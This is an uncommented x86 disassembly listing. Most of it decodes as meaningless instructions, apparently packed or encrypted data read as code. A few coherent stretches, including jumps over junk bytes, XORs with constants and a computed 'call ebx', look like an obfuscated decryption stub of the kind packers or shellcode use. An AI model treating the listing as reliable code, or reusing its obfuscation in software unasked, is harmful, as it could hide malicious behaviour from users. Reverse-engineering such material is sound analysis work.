  4082e5:	adc    BYTE PTR [eax-0x69],bh
  4082e8:	or     edi,esp
  4082ea:	js     0x4082da
  4082ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ed:	repz push cs
  4082ef:	std    
  4082f0:	icebp  
  4082f1:	lea    ebp,[edi-0x75]
  4082f4:	push   ebp
  4082f5:	adc    al,0xe9
  4082f7:	test   BYTE PTR [ecx],al
  4082f9:	add    BYTE PTR [eax],al
  4082fb:	ret    0xc507
  4082fe:	out    0xdd,eax
  408300:	std    
  408301:	cli    
  408302:	cmp    eax,0xbb29729
  408307:	sbb    DWORD PTR [eax+0x3d634a67],esp
  40830d:	jl     0x40838b
  40830f:	call   0x14bcff93
  408314:	sbb    edx,DWORD PTR [esi]
  408316:	sub    eax,edi
  408318:	cmp    al,dh
  40831a:	jle    0x408316
  40831c:	sbb    edx,DWORD PTR [edx+0x4b821e55]
  408322:	aas    
  408323:	sub    edi,DWORD PTR [ecx]
  408325:	(bad)  
  408327:	and    BYTE PTR [edi],bl
  408329:	xchg   edi,eax
  40832a:	pop    esi
  40832b:	repnz adc eax,0xab8b89fb
  408331:	cdq    
  408332:	retf   
  408333:	adc    eax,0x2db1fc56
  408338:	pushf  
  408339:	mov    eax,ds:0xc8322d17
  40833e:	sahf   
  40833f:	in     eax,0xa8
  408341:	or     cl,BYTE PTR [esi+ecx*4]
  408344:	sbb    ah,bl
  408346:	sub    DWORD PTR [edx],ecx
  408348:	fs cmp bl,cl
  40834b:	mov    eax,ds:0x26819975
  408350:	jg     0x40838e
  408352:	pushf  
  408353:	and    al,0x36
  408355:	pop    ds
  408356:	je     0x4083d3
  408358:	fcmovnu st,st(5)
  40835a:	mov    esi,0x4461a280
  40835f:	jb     0x408322
  408361:	push   ebx
  408362:	inc    esi
  408363:	inc    ecx
  408364:	sbb    edx,esi
  408366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408367:	cmc    
  408368:	das    
  408369:	test   BYTE PTR [esi],bl
  40836b:	inc    ecx
  40836c:	xor    eax,0xbe453460
  408371:	push   0x3e
  408373:	call   0xf0bec11d
  408378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408379:	xor    ebx,ecx
  40837b:	or     al,0x26
  40837d:	jmp    0x40835c
  40837f:	pop    esp
  408380:	mov    dl,0x7b
  408382:	push   0xf9529a6b
  408387:	sbb    eax,0xb97f5944
  40838c:	iret   
  40838d:	loopne 0x4083c5
  40838f:	and    bl,BYTE PTR [di-0x8a5]
  408394:	push   ecx
  408395:	and    DWORD PTR [esi],ebp
  408397:	jmp    0xf766:0xd7ea3bd3
  40839e:	or     bh,BYTE PTR [edi+0x40075e3b]
  4083a4:	mov    al,BYTE PTR [ebp+ebp*8+0x274992c7]
  4083ab:	inc    eax
  4083ac:	cmp    bl,BYTE PTR [ebp+ebx*2-0x54]
  4083b0:	mov    al,ds:0x2aeb4fbe
  4083b5:	sbb    al,0x52
  4083b8:	in     eax,dx
  4083b9:	sub    eax,0x60f42f5d
  4083be:	enter  0x97bb,0x5f
  4083c2:	sub    DWORD PTR [ebx+edi*8],esp
  4083c5:	push   ds
  4083c6:	push   0x1f88f9d3
  4083cb:	adc    al,0x5a
  4083cd:	cdq    
  4083ce:	and    DWORD PTR [eax+0xd],ebx
  4083d1:	popa   
  4083d2:	or     eax,0xb541f8fc
  4083d7:	cdq    
  4083d8:	push   ds
  4083d9:	pop    ds
  4083da:	xchg   ebp,eax
  4083db:	push   ebx
  4083dc:	dec    edi
  4083dd:	inc    ecx
  4083de:	and    ah,dh
  4083e0:	adc    al,BYTE PTR [esi]
  4083e2:	int    0x26
  4083e4:	lahf   
  4083e5:	popf   
  4083e6:	xchg   ebx,eax
  4083e7:	(bad)  
  4083e8:	jmp    0xce951e28
  4083ed:	daa    
  4083ee:	pop    ebx
  4083ef:	mov    DWORD PTR [esi],0x289ecc28
  4083f5:	(bad)  
  4083f6:	jmp    0x7f27:0x95125e7
  4083fd:	push   ebp
  4083fe:	push   ebx
  4083ff:	mov    ds:0x49cac85a,al
  408405:	push   ebx
  408406:	pushf  
  408407:	test   DWORD PTR [ecx-0x64],edi
  40840a:	or     al,0x73
  40840c:	cmp    al,0xb8
  40840e:	lea    edi,[edx]
  408410:	dec    esp
  408411:	fiadd  DWORD PTR [ebx]
  408413:	push   esi
  408414:	int3   
  408415:	inc    edx
  408416:	mov    edx,0xbcfa5e41
  40841b:	sar    DWORD PTR [edx+0x7cc16d03],0xc1
  408422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408423:	sbb    esi,DWORD PTR [edx-0x60de93a3]
  408429:	mov    cl,0x15
  40842b:	lds    ebp,FWORD PTR [ecx+0x5]
  40842e:	add    eax,0xdd62f8a0
  408433:	sub    BYTE PTR [eax-0x15dbdee1],0x60
  40843a:	lea    esi,[ecx+0x33]
  40843d:	push   ecx
  40843e:	stc    
  40843f:	clc    
  408440:	enter  0x7c1f,0x4d
  408444:	mov    ebp,0x6e9d27d4
  408449:	mov    ?,ecx
  40844b:	jp     0x408419
  40844d:	shl    DWORD PTR [edi-0x32a49ed6],0xaf
  408454:	jg     0x408411
  408456:	pop    ss
  408457:	hlt    
  408458:	add    eax,0x73731610
  40845d:	loop   0x4084b6
  40845f:	jl     0x408411
  408461:	sti    
  408462:	int3   
  408463:	adc    al,0x7
  408465:	push   es
  408466:	xor    BYTE PTR [edi],cl
  408468:	xor    al,0xbe
  40846a:	and    DWORD PTR [eax+0x6b],esp
  40846d:	leave  
  40846e:	pop    ebp
  40846f:	mov    dh,0x51
  408471:	lahf   
  408472:	xchg   ebx,eax
  408473:	scas   al,BYTE PTR es:[edi]
  408474:	lea    ebx,[edi]
  408476:	mov    WORD PTR ds:0x9b4eefc2,cs
  40847c:	cwde   
  40847d:	je     0x40849e
  40847f:	xor    eax,ecx
  408481:	jmp    0x40860a
  408486:	sub    ecx,DWORD PTR [eax]
  408488:	sti    
  408489:	je     0x408486
  40848b:	out    0xfb,eax
  40848d:	sub    ecx,DWORD PTR [ebp-0x30d3b375]
  408493:	cmp    eax,0x3fdfd9f9
  408498:	jl     0x408516
  40849a:	call   0xd6bd011e
  40849f:	inc    edi
  4084a0:	std    
  4084a1:	loop   0x408509
  4084a3:	dec    ebp
  4084a4:	arpl   WORD PTR [esi],di
  4084a6:	pop    eax
  4084a7:	ins    DWORD PTR es:[edi],dx
  4084a8:	dec    esp
  4084a9:	mov    edx,0xa72de916
  4084ae:	add    al,0xc0
  4084b0:	xor    al,BYTE PTR [edi-0x36081195]
  4084b6:	sbb    eax,DWORD PTR [ebx]
  4084b8:	and    al,0x34
  4084ba:	xchg   edx,eax
  4084bb:	imul   edx,DWORD PTR [ebp-0x75635904],0xffec149a
  4084c5:	repz mov WORD PTR [ebx],cs
  4084c8:	mov    dl,0x18
  4084ca:	mov    ah,BYTE PTR [eax+0x48]
  4084cd:	rol    BYTE PTR [edx-0x12],cl
  4084d0:	fnstenv [edx+edx*2+0x370ce051]
  4084d7:	in     ax,0x31
  4084da:	ret    
  4084db:	and    eax,0x6f6651bc
  4084e0:	adc    dl,BYTE PTR [edi]
  4084e2:	sbb    BYTE PTR [ebx],bl
  4084e4:	jb     0x408554
  4084e6:	jne    0x408550
  4084e8:	cmp    ebp,DWORD PTR [edx+0x25f3e304]
  4084ee:	or     BYTE PTR [esi],0xea
  4084f1:	xchg   BYTE PTR [edx],bh
  4084f3:	cmp    eax,0x49b1b8d7
  4084f8:	pop    ebp
  4084f9:	adc    DWORD PTR [edx-0x4698fd1d],0x367fca42
  408503:	push   0x5be21019
  408508:	dec    esi
  408509:	and    eax,0x22947137
  40850e:	psubb  mm7,QWORD PTR [ebp+0x2a2b3006]
  408515:	sbb    al,0xfa
  408517:	popa   
  408518:	cmp    ebp,DWORD PTR [esi-0x41]
  40851b:	pop    es
  40851c:	adc    DWORD PTR [esp+edx*1-0x13ea253f],eax
  408523:	jecxz  0x40850a
  408525:	mov    BYTE PTR [esp+esi*2],dl
  408528:	in     al,0xdb
  40852a:	dec    ecx
  40852b:	xchg   esi,eax
  40852c:	mov    dl,0xdd
  40852e:	cmc    
  40852f:	mov    ds:0x4f9f731c,eax
  408534:	ds mov esp,0xd191ebcb
  40853a:	shl    BYTE PTR [ecx],cl
  40853c:	cdq    
  40853d:	ins    DWORD PTR es:[edi],dx
  40853e:	and    BYTE PTR ds:[edi+0x38],dh
  408542:	jo     0x4085b4
  408544:	jno    0x408582
  408546:	pushf  
  408547:	cmp    al,0x14
  408549:	sahf   
  40854a:	outs   dx,BYTE PTR ds:[esi]
  40854b:	fmul   st,st(7)
  40854d:	mov    dh,0x4c
  40854f:	sub    ecx,esi
  408551:	pop    ebp
  408552:	mov    esp,0x52553168
  408557:	add    al,0x46
  408559:	sbb    DWORD PTR [eax-0x32daff65],ebx
  40855f:	int    0x73
  408561:	mov    bl,0x57
  408563:	jmp    0x5474:0xfd1ad460
  40856a:	aaa    
  40856b:	rol    edi,0x8
  40856e:	aas    
  40856f:	fadd   QWORD PTR [ecx+0x21]
  408572:	cli    
  408573:	data16 xor al,0xc4
  408576:	aas    
  408577:	out    0xcf,eax
  408579:	sub    al,0xa9
  40857b:	out    0x66,eax
  40857d:	test   al,0x61
  40857f:	retf   0x3693
  408582:	dec    ebx
  408583:	imul   DWORD PTR [eax-0x75]
  408586:	push   ds
  408587:	sbb    al,0x7e
  408589:	mov    bl,0xf5
  40858b:	lock or esp,DWORD PTR [ecx+0x69]
  40858f:	fsubr  QWORD PTR [ebp-0x33]
  408592:	out    dx,eax
  408593:	or     al,0xd9
  408595:	adc    DWORD PTR [esi],esi
  408597:	xor    cl,BYTE PTR [eiz*1+0x18bd1ba]
  40859e:	xlat   BYTE PTR ds:[ebx]
  40859f:	jge    0x4085f6
  4085a1:	cmp    BYTE PTR [esi+0x4f],al
  4085a4:	pusha  
  4085a5:	and    eax,0xf5eb5dca
  4085aa:	mov    ecx,0x34c92da
  4085af:	and    eax,DWORD PTR [edx+0x503c2f84]
  4085b5:	xor    BYTE PTR [ebp-0x1c],dl
  4085b8:	cdq    
  4085b9:	push   ecx
  4085ba:	call   0xaad7852b
  4085bf:	pop    ss
  4085c0:	icebp  
  4085c1:	jge    0x4085b7
  4085c3:	mov    ebp,ss
  4085c5:	adc    bl,BYTE PTR [esi+0x3f348b3c]
  4085cb:	(bad)  
  4085cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085cd:	jne    0x4085fb
  4085cf:	leave  
  4085d0:	out    dx,al
  4085d1:	sbb    bl,BYTE PTR [eax-0x4f]
  4085d4:	gs lock add eax,0x8147dd29
  4085db:	sub    BYTE PTR [edx-0x52],dl
  4085de:	imul   ebp,DWORD PTR [edx],0x2d2ba130
  4085e4:	addr16 jae 0x4085e7
  4085e7:	add    al,0x19
  4085e9:	mov    cl,0x8a
  4085eb:	into   
  4085ec:	dec    esi
  4085ed:	inc    ebp
  4085ee:	test   DWORD PTR [ebx],0xd282a513
  4085f4:	mov    BYTE PTR [ebp+0x6b],ah
  4085f7:	dec    ecx
  4085f8:	jp     0x40857b
  4085fa:	adc    eax,0x79
  4085fd:	test   eax,0x67d7e5e5
  408602:	jmp    0x598b:0x9291e363
  408609:	mov    al,0x3
  40860b:	(bad)  
  40860c:	imul   eax,DWORD PTR [edx]
  40860f:	mov    edx,DWORD PTR [ebp-0x4]
  408612:	xor    edx,ecx
  408614:	mov    ecx,DWORD PTR [ebp+0x8]
  408617:	lea    ecx,[edx+ecx*1+0x32729e]
  40861e:	cmp    ecx,eax
  408620:	jmp    0x4087a9
  408625:	test   DWORD PTR [edi],esp
  408627:	in     al,dx
  408628:	iret   
  408629:	jp     0x4085f2
  40862b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862c:	jge    0x4085fc
  40862e:	(bad)  
  40862f:	loope  0x408624
  408631:	mov    dl,0xed
  408633:	int    0x1e
  408635:	dec    ebx
  408636:	ds jl  0x4086b5
  408639:	call   0xa0bd02bd
  40863e:	arpl   sp,bp
  408640:	ins    BYTE PTR es:[edi],dx
  408641:	ins    DWORD PTR es:[edi],dx
  408642:	pusha  
  408643:	xchg   esp,eax
  408644:	inc    ecx
  408645:	js     0x408660
  408647:	outs   dx,BYTE PTR ds:[esi]
  408648:	pop    esi
  408649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40864a:	push   esi
  40864b:	xchg   ebp,esp
  40864d:	add    al,0xb0
  40864f:	mov    esi,0x3083a6bc
  408654:	ins    BYTE PTR es:[edi],dx
  408655:	(bad)  
  408656:	out    dx,eax
  408657:	nop
  408658:	or     BYTE PTR [ebx+esi*1],bl
  40865b:	test   eax,0x11e963a9
  408660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408661:	ds shl al,1
  408664:	std    
  408665:	sbb    al,0x79
  408667:	stos   BYTE PTR es:[edi],al
  408668:	cmp    al,0x58
  40866a:	mov    ch,0xe9
  40866c:	out    dx,eax
  40866d:	xchg   eax,edx
  40866f:	pop    ecx
  408670:	leave  
  408671:	xor    al,0xea
  408673:	stc    
  408674:	push   ecx
  408675:	lods   al,BYTE PTR ds:[esi]
  408676:	retf   0x3b5b
  408679:	inc    ebx
  40867a:	adc    bl,0xe4
  40867d:	lea    edx,[esi-0x5009581e]
  408683:	in     eax,dx
  408684:	or     al,0x5e
  408686:	sbb    al,0xda
  408688:	pop    eax
  408689:	ins    BYTE PTR es:[edi],dx
  40868a:	pop    esp
  40868b:	shl    DWORD PTR [bp+si],cl
  40868e:	out    dx,al
  40868f:	test   eax,0xdbaae7ce
  408694:	je     0x408630
  408696:	pop    edi
  408697:	lahf   
  408698:	inc    esi
  408699:	les    ebx,FWORD PTR [edx-0x61b4b30]
  40869f:	int    0xc
  4086a1:	xchg   ecx,eax
  4086a2:	xchg   esp,edx
  4086a4:	push   0x2d830968
  4086a9:	adc    eax,0xb7821f4d
  4086ae:	mov    cl,0xc0
  4086b0:	loop   0x408722
  4086b2:	lock pushf 
  4086b4:	xchg   DWORD PTR [ebp+0x4e],ebx
  4086b7:	dec    esi
  4086b8:	fsub   QWORD PTR [edi+edx*2-0x13]
  4086bc:	clc    
  4086bd:	sub    al,0x72
  4086bf:	mov    esp,0x1c901aef
  4086c4:	add    DWORD PTR [ebp-0x54],edx
  4086c7:	jmp    0xc02a2049
  4086cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086cd:	push   ebx
  4086ce:	xchg   edi,ebx
  4086d0:	test   eax,0x9936957
  4086d5:	sub    al,0xf4
  4086d7:	mov    esp,0x206197ab
  4086dc:	fcmovnbe st,st(5)
  4086de:	sbb    al,0x90
  4086e0:	push   esi
  4086e1:	call   0x1636:0xc162e626
  4086e8:	inc    edx
  4086e9:	addr16 xor al,0xc4
  4086ec:	jp     0x408671
  4086ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ef:	mov    edi,0xe685df0f
  4086f4:	(bad)  [ecx+0x3a8c0c40]
  4086fa:	and    DWORD PTR [edi-0x34c93d08],ebx
  408700:	scas   al,BYTE PTR es:[edi]
  408701:	xchg   ecx,eax
  408702:	fwait
  408703:	es (bad) 
  408705:	adc    DWORD PTR [esi],edx
  408707:	cmp    al,0xfa
  408709:	adc    BYTE PTR [ebp+0x7b],dh
  40870c:	pop    ebx
  40870d:	xchg   esi,eax
  40870e:	fcmove st,st(5)
  408710:	mov    al,0xdd
  408712:	xor    al,0x91
  408714:	mov    edx,0x5116ad71
  408719:	inc    bx
  40871b:	test   BYTE PTR [edi-0x20],bl
  40871e:	mov    esp,0xdd35ede
  408723:	(bad)  
  408724:	mov    al,0x22
  408726:	mov    esp,0xa8871c63
  40872b:	loopne 0x408743
  40872d:	scas   eax,DWORD PTR es:[edi]
  40872e:	enter  0x2905,0xdc
  408732:	jne    0x40879c
  408734:	add    DWORD PTR [eax+edx*4+0x13b8f894],ebp
  40873b:	(bad)  
  40873c:	cmp    al,0x33
  40873e:	xchg   esi,eax
  40873f:	sbb    ch,BYTE PTR [esi]
  408741:	jne    0x40877b
  408743:	jg     0x40879d
  408745:	std    
  408746:	mov    ecx,0x1b0fca1f
  40874b:	hlt    
  40874c:	das    
  40874d:	sub    eax,0xe96cbbd8
  408752:	add    DWORD PTR [eax],eax
  408754:	push   ebp
  408755:	cmp    esp,DWORD PTR [eax]
  408757:	sbb    DWORD PTR [ecx],ebx
  408759:	imul   esp,DWORD PTR [edx+0x4a],0x3a
  40875d:	xchg   edx,eax
  40875e:	pop    es
  40875f:	mov    edx,0x160cc9b1
  408764:	enter  0x1b5a,0xae
  408768:	mov    dh,0xdd
  40876a:	sub    al,0xc3
  40876c:	dec    eax
  40876d:	add    cl,cl
  40876f:	nop
  408770:	push   0xd7daabd6
  408775:	sbb    DWORD PTR [ebx-0xb],edx
  408778:	pop    esi
  408779:	mov    bh,dl
  40877b:	or     BYTE PTR [ebp-0x630e65ae],0xc6
  408782:	or     al,0x3e
  408784:	in     eax,0x6
  408786:	frstor [ecx+0x2038059a]
  40878c:	mov    al,ds:0xb232c631
  408791:	icebp  
  408792:	pusha  
  408793:	scas   al,BYTE PTR es:[edi]
  408794:	jmp    0x86b1:0x2db3ce95
  40879b:	dec    esp
  40879c:	aam    0x1b
  40879e:	bound  edx,QWORD PTR [esi+0x334452dc]
  4087a4:	fisubr DWORD PTR [ebx+0xf4d1e26]
  4087aa:	test   ecx,ebp
  4087ac:	idiv   edi
  4087ae:	dec    DWORD PTR [ebx+0x5e9de]
  4087b4:	add    BYTE PTR [eax],al
  4087b6:	mov    ebx,0x32729e
  4087bb:	mov    eax,DWORD PTR [ebp-0x4]
  4087be:	xor    eax,0x7510857
  4087c3:	add    eax,ebx
  4087c5:	mov    DWORD PTR [ebp-0xc],eax
  4087c8:	xor    ebx,ebx
  4087ca:	lea    eax,[ebp-0x10]
  4087cd:	add    ebx,DWORD PTR [eax]
  4087cf:	call   ebx
  4087d1:	xor    ebx,ebx
  4087d3:	inc    ebx
  4087d4:	cmp    DWORD PTR [ebp+0x10],ebx
  4087d7:	je     0x40897e
  4087dd:	xchg   edx,eax
  4087de:	push   0xa
  4087e0:	pop    ecx
  4087e1:	push   0x4
  4087e3:	pop    ebx
  4087e4:	inc    ebx
  4087e5:	xchg   ebx,ecx
  4087e7:	sub    ebx,ecx
  4087e9:	xchg   ebx,ecx
  4087eb:	dec    ecx
  4087ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4087ef:	jmp    0x408978
  4087f4:	hlt    
  4087f5:	jecxz  0x4087ee
  4087f7:	dec    esi
  4087f8:	jnp    0x408874
  4087fa:	pop    ecx
  4087fb:	std    
  4087fc:	sahf   
  4087fd:	retf   0x4846
  408800:	div    BYTE PTR [ecx-0x63]
  408803:	fsub   DWORD PTR [edi]
  408805:	xor    BYTE PTR [esp+edi*2-0x18],bh
  408809:	jg     0x408887
  40880b:	jl     0x408846
  40880d:	sbb    al,0xb1
  40880f:	push   ds
  408810:	xchg   ebp,eax
  408811:	dec    eax
  408812:	jnp    0x4087e1
  408814:	arpl   WORD PTR [eax+ebx*2-0x39],bp
  408818:	push   esi
  408819:	or     ecx,DWORD PTR [ebx-0x63d5001c]
  40881f:	adc    bl,BYTE PTR [eax]
  408821:	clc    
  408822:	sub    esi,ebx
  408824:	mov    ch,0x2e
  408826:	jne    0x40887e
  408828:	and    eax,0x8d01b492
  40882d:	call   0xec8e:0xb0551ad2
  408834:	fwait
  408835:	cmp    DWORD PTR [esi+esi*2-0x55fd43c9],esi
  40883c:	iret   
  40883d:	dec    edi
  40883e:	mov    eax,ds:0xed2f74d7
  408843:	ss icebp 
  408845:	popf   
  408846:	int3   
  408847:	mov    eax,0x7fe695bf
  40884c:	test   BYTE PTR [eax+0x636ead28],ch
  408852:	dec    eax
  408853:	repnz xchg dh,al
  408856:	mov    DWORD PTR ds:0x56ef1f7f,ebx
  40885c:	stos   BYTE PTR es:[edi],al
  40885d:	xor    esp,ebx
  40885f:	sbb    eax,0x1e579ab3
  408864:	pop    ds
  408865:	xchg   esp,eax
  408866:	vcmpss xmm5,xmm7,DWORD PTR [edx],0x5f
  40886b:	or     al,BYTE PTR [ecx-0x36e01617]
  408871:	rol    BYTE PTR [eax+0x1a],0x90
  408875:	sbb    al,0x9f
  408877:	leave  
  408878:	and    eax,0x2c8120af
  40887d:	stos   BYTE PTR es:[edi],al
  40887e:	cdq    
  40887f:	cmp    esi,DWORD PTR [ecx-0xf]
  408882:	mov    bh,0x1
  408884:	fst    DWORD PTR [ecx+0x2e7cc0b9]
  40888a:	int    0x87
  40888c:	mov    WORD PTR [esi+edi*1+0x40],?
  408890:	sbb    al,0x3f
  408892:	out    0x56,al
  408894:	mov    ds:0xd21f59b1,eax
  408899:	or     dl,BYTE PTR ds:[eax+ebx*8-0x6e1dc1d2]
  4088a1:	sub    BYTE PTR [ecx+edi*1+0x23049d99],dl
  4088a8:	(bad)  
  4088a9:	cmp    eax,esi
  4088ab:	push   0xa54944d5
  4088b0:	pusha  
  4088b1:	jbe    0x408862
  4088b3:	cli    
  4088b4:	cli    
  4088b5:	inc    ebx
  4088b6:	dec    esp
  4088b7:	xchg   edi,eax
  4088b8:	jg     0x40885a
  4088ba:	mov    ah,0xda
  4088bc:	mov    dh,0x5d
  4088be:	imul   esp,DWORD PTR [ecx-0x31],0x80d118e0
  4088c5:	mov    esp,0x3d5f8f5
  4088ca:	ds cwde 
  4088cc:	aad    0x87
  4088ce:	xor    BYTE PTR ds:0x9e839868,bh
  4088d4:	push   eax
  4088d5:	sbb    eax,0x9549626c
  4088da:	xor    dh,dh
  4088dc:	ss adc dl,al
  4088df:	sbb    edx,DWORD PTR [esp+ebx*4-0x21]
  4088e3:	popf   
  4088e4:	adc    esp,ebx
  4088e6:	push   edi
  4088e7:	sbb    ah,bh
  4088e9:	mov    ebx,0xa3efc32a
  4088ee:	mov    bl,0xa0
  4088f0:	fwait
  4088f1:	dec    esi
  4088f2:	sub    bl,al
  4088f4:	pop    edx
  4088f5:	js     0x4088d2
  4088f7:	sbb    eax,0xb497ab8e
  4088fc:	mov    esp,0xe4d5a0fd
  408901:	call   0x5c8f14d0
  408906:	push   ss
  408907:	leave  
  408908:	repnz add DWORD PTR [eax],ebx
  40890b:	mov    ebp,0xadbc8a1
  408910:	inc    ecx
  408911:	call   DWORD PTR [ebp+0x62d462cf]
  408917:	and    al,0x60
  408919:	jbe    0x40893f
  40891b:	adc    eax,0xf72e74c8
  408920:	shl    DWORD PTR [edi],1
  408922:	mov    edi,DWORD PTR [esi]
  408924:	push   esi
  408925:	sub    bl,bl
  408927:	out    dx,eax
  408928:	int    0xd1
  40892a:	mov    ebx,0xaa8177b
  40892f:	and    BYTE PTR [esi],al
  408931:	stos   BYTE PTR es:[edi],al
  408932:	repnz iret 
  408934:	push   esp
  408935:	pop    ebx
  408936:	mov    dh,0x8e
  408938:	gs gs dec edi
  40893b:	cmp    BYTE PTR [edi+ebp*4],cl
  40893e:	or     BYTE PTR [ebp-0x30217e6f],ch
  408944:	out    0xc0,al
  408946:	or     DWORD PTR [esi],ebp
  408948:	jo     0x4088dc
  40894a:	sbb    dl,BYTE PTR [eax+0x5d]
  40894d:	push   0x30bc75a8
  408952:	cmp    al,0x66
  408954:	mov    bl,0xf
  408956:	imul   ebx,ebp,0x25
  408959:	mov    ebx,0xa0ca8ae3
  40895e:	cmc    
  40895f:	add    al,0xe2
  408961:	pop    ebx
  408962:	daa    
  408963:	and    ah,BYTE PTR ds:0x69bbb715
  408969:	push   edi
  40896a:	jg     0x408924
  40896c:	dec    esp
  40896d:	push   ds
  40896e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40896f:	xchg   BYTE PTR [eax],bl
  408971:	jle    0x40892d
  408973:	gs cmp cl,ah
  408976:	scas   al,BYTE PTR es:[di]
  408978:	imul   eax,ecx
  40897b:	add    esp,eax
  40897d:	xchg   edx,eax
  40897e:	push   eax
  40897f:	xor    ebx,ebx
  408981:	mov    edx,esp
  408983:	dec    edx
  408984:	jmp    0x408b0d
  408989:	xchg   BYTE PTR [edx+0x456bbe5f],ah
  40898f:	mov    ecx,0xfaf08d7a
  408994:	mov    esi,0x7c707b49
  408999:	xchg   ebx,eax
  40899a:	xor    edi,DWORD PTR [esp+edi*2-0x18]
  40899e:	jg     0x408a1c
  4089a0:	jl     0x4089ea
  4089a2:	xchg   edx,eax
  4089a3:	and    DWORD PTR [ebp-0x3bc6a687],0x7020291c
  4089ad:	add    bl,BYTE PTR [ebp-0x7]
  4089b0:	call   0x27a0:0xfb9c49c1
  4089b7:	or     bl,al
  4089b9:	aam    0xbe
  4089bb:	mov    ah,0x7c
  4089bd:	mov    al,ds:0xc7146d79
  4089c2:	cmp    BYTE PTR [ebx+0x725b359f],cl
  4089c8:	outs   dx,BYTE PTR ds:[esi]
  4089c9:	jbe    0x40894c
  4089cb:	mov    eax,ds:0x631a3cac
  4089d0:	retf   
  4089d1:	enter  0xac04,0x97
  4089d5:	jle    0x4089e8
  4089d7:	mov    dl,0x8d
  4089d9:	(bad)  
  4089da:	mov    al,ds:0x17342990
  4089df:	sar    BYTE PTR [edi+0x19],1
  4089e2:	jnp    0x408a59
  4089e4:	test   DWORD PTR [edx+ebp*2+0x1ef8318],edi
  4089eb:	shr    edi,cl
  4089ed:	in     al,dx
  4089ee:	add    edx,DWORD PTR [ebx-0x5632836d]
  4089f4:	pop    ebx
  4089f5:	or     cl,BYTE PTR [esp+ebp*8]
  4089f8:	sbb    bh,BYTE PTR [ebp-0x9587eed]
  4089fe:	out    0x8b,eax
  408a00:	stos   BYTE PTR es:[edi],al
  408a01:	test   BYTE PTR [esi-0x21],dh
  408a04:	pop    esi
  408a05:	dec    esi
  408a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a07:	sti    
  408a08:	leave  
  408a09:	outs   dx,BYTE PTR ds:[esi]
  408a0a:	dec    edi
  408a0b:	into   
  408a0c:	mov    dl,0x33
  408a0e:	mov    al,ds:0xfcc91940
  408a13:	fld    QWORD PTR [ecx+0x30085928]
  408a19:	inc    esp
  408a1a:	sbb    DWORD PTR [ecx-0x48],esi
  408a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a1e:	add    sp,bp
  408a21:	push   0x36
  408a23:	int    0x5a
  408a25:	(bad)  
  408a26:	bound  esi,QWORD PTR [edx-0x60]
  408a29:	into   
  408a2a:	adc    ecx,DWORD PTR [esi-0x2e]
  408a2d:	int3   
  408a2e:	jo     0x4089b1
  408a30:	pop    ss
  408a31:	rol    eax,1
  408a33:	jbe    0x408a31
  408a35:	mov    gs,WORD PTR [esi+ebx*8+0x37ed3085]
  408a3c:	fs adc cl,cl
  408a3f:	pushf  
  408a40:	std    
  408a41:	outs   dx,BYTE PTR ds:[esi]
  408a42:	sub    DWORD PTR [ebx+esi*8-0x79c987ea],edi
  408a49:	add    BYTE PTR [esi-0x228a7b20],al
  408a4f:	lods   al,BYTE PTR ds:[esi]
  408a50:	inc    ebp
  408a51:	repnz mov edx,0xe78e85c2
  408a57:	sbb    al,0x16
  408a59:	dec    ecx
  408a5a:	xchg   edi,eax
  408a5b:	loop   0x408aad
  408a5d:	pop    es
  408a5e:	lods   eax,DWORD PTR ds:[esi]
  408a5f:	(bad)  
  408a60:	aaa    
  408a61:	popa   
  408a62:	dec    esi
  408a63:	inc    edi
  408a64:	jle    0x408a1b
  408a66:	dec    ebp
  408a67:	sbb    BYTE PTR [edi+0xb],cl
  408a6a:	lock lds eax,FWORD PTR [ecx+eax*8-0x6c87c49b]
  408a72:	cdq    
  408a73:	and    dl,bl
  408a75:	into   
  408a76:	sbb    eax,0xd3ba4cf4
  408a7b:	arpl   WORD PTR [eax*4-0x32b27c66],bx
  408a82:	leave  
  408a83:	lods   al,BYTE PTR ds:[esi]
  408a84:	mov    ds:0x6aee5a31,al
  408a89:	jl     0x408abb
  408a8b:	mov    bh,0x55
  408a8d:	cmp    al,0x37
  408a8f:	jecxz  0x408a49
  408a91:	call   0x6d6ac376
  408a96:	sub    al,0x2d
  408a98:	mov    ebp,0x7a433bba
  408a9d:	jns    0x408a3c
  408a9f:	push   esi
  408aa0:	hlt    
  408aa1:	clc    
  408aa2:	outs   dx,BYTE PTR ds:[esi]
  408aa3:	pop    edi
  408aa4:	and    al,0x71
  408aa6:	rcr    esp,cl
  408aa8:	pop    esp
  408aa9:	mov    cl,0xb1
  408aab:	adc    BYTE PTR [ebx+0x7b82b69e],ch
  408ab1:	jmp    0x2078aa9e
  408ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ab7:	sahf   
  408ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ab9:	cmp    eax,0x9aa0514d
  408abe:	pop    es
  408abf:	xor    DWORD PTR es:[ecx+0x2ca4934a],ebx
  408ac6:	xchg   ebx,eax
  408ac7:	mov    edx,0x61104a0d
  408acc:	rcl    dh,0xb6
  408acf:	push   edi
  408ad0:	iret   
  408ad1:	shl    DWORD PTR [edx],cl
  408ad3:	and    eax,0x86db9fa2
  408ad8:	mov    eax,DWORD PTR [esp+esi*8]
  408adb:	in     eax,dx
  408adc:	leave  
  408add:	popa   
  408ade:	lea    esp,[esi+0x492b3c23]
  408ae4:	gs cs loope 0x408ae2
  408ae8:	pop    esi
  408ae9:	pop    ss
  408aea:	addr16 icebp 
  408aec:	sub    al,0x3e
  408aee:	mov    esp,DWORD PTR [eax-0x3bff229c]
  408af4:	iret   
  408af5:	and    ebp,esi
  408af7:	mov    esi,0xb86dc907
  408afc:	jae    0x408abc
  408afe:	test   BYTE PTR [eax],ch
